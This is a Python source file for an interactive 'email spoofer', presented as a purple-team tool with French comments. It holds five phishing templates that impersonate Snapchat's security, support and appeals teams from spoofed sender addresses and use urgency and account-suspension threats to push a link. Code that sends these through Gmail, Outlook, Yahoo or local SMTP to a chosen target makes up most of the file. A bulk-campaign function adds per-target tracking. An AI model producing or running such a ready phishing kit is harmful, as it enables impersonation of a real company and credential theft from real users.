"""
╔══════════════════════════════════════════════════════════════╗
║  EMAIL SPOOFER — Purple Team Tool                           ║
║  Envoie des emails avec un expéditeur personnalisé          ║
║  Usage: python tools/email_spoofer.py                       ║
╚══════════════════════════════════════════════════════════════╝
"""
import os, sys, smtplib, json
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from datetime import datetime

BASE = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

# ── Templates d'emails ──
TEMPLATES = {
    "1": {
        "name": "🔐 Alerte de sécurité Snapchat",
        "subject": "🔴 Alerte de sécurité — Nouvelle connexion détectée",
        "sender": "security@snapchat.com",
        "body": """Bonjour,

Nous avons détecté une tentative de connexion suspecte à votre compte Snapchat depuis un nouvel appareil.

📍 Localisation approximative : Paris, France
🕐 Date : {date}
🌐 Navigateur : Chrome / Windows

Si vous n'êtes pas à l'origine de cette connexion, sécurisez votre compte immédiatement :

🔗 {lien}

Équipe sécurité Snapchat
© Snapchat Security
"""
    },
    "2": {
        "name": "🎁 Snapchat+ — Accès anticipé gratuit",
        "subject": "🎉 Vous avez été sélectionné pour Snapchat+ gratuit !",
        "sender": "snapchat-plus@snapchat.com",
        "body": """Félicitations ! 🎉

Vous faites partie des 1 000 utilisateurs sélectionnés pour tester Snapchat+ en avant-première, totalement gratuitement pendant 3 mois.

✅ Stickers exclusifs
✅ Vues illimitées des stories
✅ Badge Snapchat+ vérifié
✅ Replay illimité

Activez votre accès ici (offre limitée) :

🔗 {lien}

L'offre expire dans 48h.
Snapchat+ Team
"""
    },
    "3": {
        "name": "📱 Vérification compte requise",
        "subject": "⚠️ Action requise — Vérification de votre compte Snapchat",
        "sender": "support@snapchat.com",
        "body": """Bonjour,

Suite à une mise à jour de nos conditions d'utilisation, nous vous demandons de vérifier votre compte pour continuer à utiliser Snapchat sans interruption.

🔒 Votre compte sera suspendu dans 24h si vous ne confirmez pas votre identité.

👉 Vérifier mon compte : {lien}

Merci de votre compréhension,
L'équipe Snapchat
"""
    },
    "4": {
        "name": "💀 Compte désactivé — Réactivation",
        "subject": "🚫 Votre compte Snapchat a été désactivé",
        "sender": "appeals@snapchat.com",
        "body": """Bonjour,

Votre compte Snapchat a été temporairement désactivé suite à une violation présumée de nos conditions d'utilisation.

Pour faire appel de cette décision et réactiver votre compte, veuillez confirmer votre identité :

🔗 {lien}

Délai de recours : 7 jours
Équipe intégrité Snapchat
"""
    },
    "5": {
        "name": "👻 Snapchat — Nouvel appareil connecté",
        "subject": "📲 Nouvel appareil connecté à votre compte",
        "sender": "no-reply@snapchat.com",
        "body": """Bonjour {pseudo},

Un nouvel appareil s'est connecté à votre compte Snapchat :

📱 Appareil : iPhone 15 Pro
📍 Position approximative : {ville}
🕐 Il y a quelques minutes

Si c'était vous, ignorez ce message.
Si ce n'était pas vous, sécurisez votre compte :

🔗 {lien}

L'équipe Snapchat
"""
    }
}

# ── SMTP configs ──
SMTP_SERVERS = {
    "1": {"host": "smtp.gmail.com", "port": 587, "tls": True, "name": "Gmail"},
    "2": {"host": "smtp-mail.outlook.com", "port": 587, "tls": True, "name": "Outlook"},
    "3": {"host": "smtp.mail.yahoo.com", "port": 587, "tls": True, "name": "Yahoo"},
    "4": {"host": "localhost", "port": 25, "tls": False, "name": "SMTP local (25)"},
    "5": {"host": "localhost", "port": 587, "tls": True, "name": "SMTP local (587)"},
}


def send_email(smtp_config, sender_email, sender_password, from_name, to_email, subject, body):
    """Envoyer un email spoofé."""
    try:
        msg = MIMEMultipart()
        msg["From"] = f"{from_name} <{sender_email}>"
        msg["To"] = to_email
        msg["Subject"] = subject
        msg.attach(MIMEText(body, "plain", "utf-8"))

        server = smtplib.SMTP(smtp_config["host"], smtp_config["port"])
        server.set_debuglevel(0)
        server.ehlo()
        if smtp_config["tls"]:
            server.starttls()
            server.ehlo()
        if sender_password:
            server.login(sender_email, sender_password)

        server.sendmail(sender_email, [to_email], msg.as_string())
        server.quit()
        return True, "Email envoyé avec succès !"
    except Exception as e:
        return False, f"Erreur : {e}"


def preview_template(template_id, lien="http://localhost:8080", pseudo="Utilisateur", ville="Paris"):
    """Afficher un aperçu du template."""
    tpl = TEMPLATES.get(template_id)
    if not tpl:
        return None
    body = tpl["body"].format(
        date=datetime.now().strftime("%d/%m/%Y à %H:%M"),
        lien=lien,
        pseudo=pseudo,
        ville=ville
    )
    return {
        "from": f"{tpl['name'].split('—')[0].strip()} <{tpl['sender']}>",
        "subject": tpl["subject"],
        "body": body
    }


def interactive_menu():
    """Menu interactif pour l'envoi d'email."""
    from colorama import init, Fore, Style
    init()
    R = Fore.RED; G = Fore.GREEN; Y = Fore.YELLOW; C = Fore.CYAN; M = Fore.MAGENTA; X = Style.RESET_ALL; D = Style.DIM

    while True:
        os.system("cls" if os.name == "nt" else "clear")
        print(f"\n  {M}╔══════════════════════════════════════════════╗{X}")
        print(f"  {M}║         EMAIL SPOOFER — Purple Team        ║{X}")
        print(f"  {M}╚══════════════════════════════════════════════╝{X}")
        print()
        print(f"  {C}TEMPLATES DISPONIBLES :{X}")
        for k, v in TEMPLATES.items():
            print(f"    {G}[{k}]{X} {v['name']}")
        print(f"    {D}[0]{X} Retour")
        print()

        choix = input(f"  {G}└─>{X} ").strip()
        if choix == "0":
            return
        if choix not in TEMPLATES:
            continue

        # Preview
        tpl = TEMPLATES[choix]
        os.system("cls" if os.name == "nt" else "clear")
        print(f"\n  {C}APERÇU DU TEMPLATE :{X}")
        print(f"  {D}De :{X} {tpl['sender']}")
        print(f"  {D}Objet :{X} {tpl['subject']}")
        print(f"  {D}Message :{X}")
        print(f"  {Y}{tpl['body'].format(date='[DATE]', lien='[LIEN]', pseudo='[PSEUDO]', ville='[VILLE]')}{X}")
        print()

        # Config
        lien = input(f"  {C}Lien du lab {D}(defaut: http://localhost:8080){X} > ").strip() or "http://localhost:8080"
        destinataire = input(f"  {C}Email de la cible >{X} ").strip()
        if not destinataire:
            continue

        pseudo = input(f"  {C}Pseudo {D}(optionnel){X} > ").strip() or "Utilisateur"
        ville = input(f"  {C}Ville {D}(optionnel){X} > ").strip() or "Paris"

        # SMTP
        os.system("cls" if os.name == "nt" else "clear")
        print(f"\n  {C}Serveur SMTP :{X}")
        for k, v in SMTP_SERVERS.items():
            print(f"    {G}[{k}]{X} {v['name']} ({v['host']}:{v['port']})")
        print()
        smtp_choice = input(f"  {G}└─>{X} ").strip()
        if smtp_choice not in SMTP_SERVERS:
            continue
        smtp = SMTP_SERVERS[smtp_choice]

        from_email = input(f"  {C}Email expéditeur {D}(defaut: {tpl['sender']}){X} > ").strip() or tpl['sender']
        from_name = tpl['name'].split('—')[0].strip()
        password = input(f"  {C}Mot de passe SMTP {D}(vide si pas besoin){X} > ").strip()

        # Send
        body = tpl["body"].format(date=datetime.now().strftime("%d/%m/%Y à %H:%M"), lien=lien, pseudo=pseudo, ville=ville)
        success, msg = send_email(smtp, from_email, password, from_name, destinataire, tpl["subject"], body)

        if success:
            print(f"\n  {G}✓ Email envoyé avec succès à {destinataire}{X}")
        else:
            print(f"\n  {R}✗ {msg}{X}")

        input(f"\n  {D}[Appuie sur Entrée]{X}")


if __name__ == "__main__":
    interactive_menu()


def send_bulk(smtp_config, from_email, from_name, targets, subject, body_template, url, campaign_id=None):
    """Envoyer un email en masse a une liste de cibles.
    
    Args:
        smtp_config: dict with host, port, tls keys
        from_email: expediteur
        from_name: nom affiche
        targets: list of dicts with email, pseudo, ville, id
        subject: sujet de l'email
        body_template: template avec {pseudo}, {ville}, {lien}, {date}
        url: base URL du lab
        campaign_id: optionnel, pour tracking
    
    Returns:
        (sent_count, failed_count, results)
    """
    from datetime import datetime
    results = []
    sent = 0
    failed = 0
    
    for t in targets:
        try:
            # Generer lien unique avec tracking
            tracking_params = ""
            if campaign_id and t.get('id'):
                tracking_params = "?cid={}&tid={}".format(campaign_id, t['id'])
            full_url = url + tracking_params
            
            # Personaliser le corps
            body = body_template.format(
                pseudo=t.get('pseudo', 'Utilisateur'),
                ville=t.get('ville', 'Paris'),
                lien=full_url,
                date=datetime.now().strftime("%d/%m/%Y a %H:%M")
            )
            
            import smtplib
            from email.mime.text import MIMEText
            from email.mime.multipart import MIMEMultipart
            
            msg = MIMEMultipart()
            msg["From"] = "{} <{}>".format(from_name, from_email)
            msg["To"] = t["email"]
            msg["Subject"] = subject
            msg.attach(MIMEText(body, "plain", "utf-8"))
            
            server = smtplib.SMTP(smtp_config["host"], smtp_config["port"])
            server.ehlo()
            if smtp_config.get("tls"):
                server.starttls()
                server.ehlo()
            password = smtp_config.get("password", "")
            if password:
                server.login(from_email, password)
            
            server.sendmail(from_email, [t["email"]], msg.as_string())
            server.quit()
            results.append({"email": t["email"], "ok": True})
            sent += 1
        except Exception as e:
            results.append({"email": t["email"], "ok": False, "error": str(e)})
            failed += 1
    
    return sent, failed, results
